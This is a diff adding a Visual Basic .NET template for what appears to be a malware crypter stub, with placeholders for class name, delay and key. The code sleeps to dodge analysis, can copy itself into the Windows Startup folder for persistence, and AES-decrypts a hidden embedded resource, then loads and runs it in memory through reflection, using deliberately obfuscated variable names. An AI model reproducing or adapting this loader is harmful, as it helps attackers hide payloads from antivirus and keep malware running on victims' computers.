@@ -1,0 +1,85 @@
+Imports System, Microsoft.VisualBasic
+Imports Microsoft.Win32
+Imports System.Windows
+Imports System.Windows.Forms
+Imports System.Reflection
+Imports System.Text
+Imports System.Security.Cryptography
+Imports System.IO.Compression
+Imports System.IO
+Imports System.Diagnostics
+Imports System.Runtime.InteropServices
+Imports System.Collections
+Imports System.Collections.Generic
+Imports System.Data
+
+
+Public Class %Class%
+
+    Public Shared Sub main()
+	Threading.Thread.Sleep(%sleep% * 1000)
+	'%STARTUP% %StartupSub%
+	%RunSub%
+    End Sub
+
+
+
+
+
+'%STARTUP%   Public Shared Sub %StartupSub%
+'%STARTUP%   Dim STUP As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\File01.exe"
+'%STARTUP%   If Application.ExecutablePath <> STUP Then
+'%STARTUP%   IO.File.Copy(Application.ExecutablePath, STUP, True)
+'%STARTUP%   Process.Start(STUP)
+'%STARTUP%   End
+'%STARTUP%   End If
+'%STARTUP%   End sub
+
+
+
+	Public Shared Sub %RunSub%
+Dim %Asm% As Assembly = Assembly.GetExecutingAssembly()
+Dim %Res% As New Resources.ResourceManager("Lime", %Asm%)
+    
+	Dim FR = AES_Decrypt(%Res%.GetObject("FirstResource"),"%KEY%")
+	Dim Sec = byyt(FR)
+Dim J As Object = Reflection.Assembly.Load(Sec)
+Dim N As Object = System.Reflection.MethodBase.GetMethodFromHandle(J.EntryPoint.MethodHandle)
+Dim V As Object = N.Invoke(0, Nothing)
+
+	End Sub
+
+
+
+	Public Shared Function AES_Decrypt(ByVal input As String, ByVal pass As String) As String
+        Dim AES As New System.Security.Cryptography.RijndaelManaged
+        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
+        Dim decrypted As String = ""
+        Try
+            Dim hash(31) As Byte
+            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
+            Array.Copy(temp, 0, hash, 0, 16)
+            Array.Copy(temp, 0, hash, 15, 16)
+            AES.Key = hash
+            AES.Mode = Security.Cryptography.CipherMode.ECB
+            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
+            Dim Buffer As Byte() = Convert.FromBase64String(input)
+            decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
+            Return decrypted
+        Catch ex As Exception
+        End Try
+    End Function
+
+
+    Public Shared Function byyt(ByVal fgdhrthtrgh As String) As Byte()
+        Dim sdgfdfbnh
+        Dim ytjrjtyjtrhgh() As Byte
+        fgdhrthtrgh = Replace(fgdhrthtrgh, " ", "")
+        ReDim ytjrjtyjtrhgh((Len(fgdhrthtrgh) \ 2) - 1)
+        For sdgfdfbnh = 0 To UBound(ytjrjtyjtrhgh) - 2
+            ytjrjtyjtrhgh(sdgfdfbnh) = CLng("&H" & Mid$(fgdhrthtrgh, 2 * sdgfdfbnh + 1, 2))
+        Next
+        byyt = ytjrjtyjtrhgh
+    End Function
+
+	End Class
